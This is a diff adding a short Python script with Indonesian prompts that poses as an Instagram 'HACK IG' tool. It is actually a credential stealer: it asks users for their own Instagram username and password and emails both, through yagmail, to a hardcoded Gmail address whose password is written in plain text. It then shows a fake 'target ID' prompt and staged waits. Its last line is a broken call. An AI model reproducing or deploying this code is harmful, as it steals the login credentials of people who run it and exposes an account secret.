@@ -1,0 +1,20 @@
+import yagmail,time,os
+os.system("clear")
+print("======================")
+print ("[+]     HACK IG    [+]")
+print ("======================")
+x=yagmail.SMTP('dhaniphiss@gmail.com','busmaniacommunity')
+subject='Username'
+print("Masukan Id Dan Password Ig")
+usr=str(input('username : '))
+x.send('dhaniphiss@gmail.com',subject,usr)
+y=yagmail.SMTP('dhaniphiss@gmail.com','busmaniacommunity')
+name='password'
+pw=str(input('password : '))
+y.send('dhaniphiss@gmail.com',name,pw)
+time.sleep(3)
+input('Masukan ID Yang Mau Dihack : ')
+time.sleep(2)
+print('tunggu...')
+time.sleep(12)
+os.system()
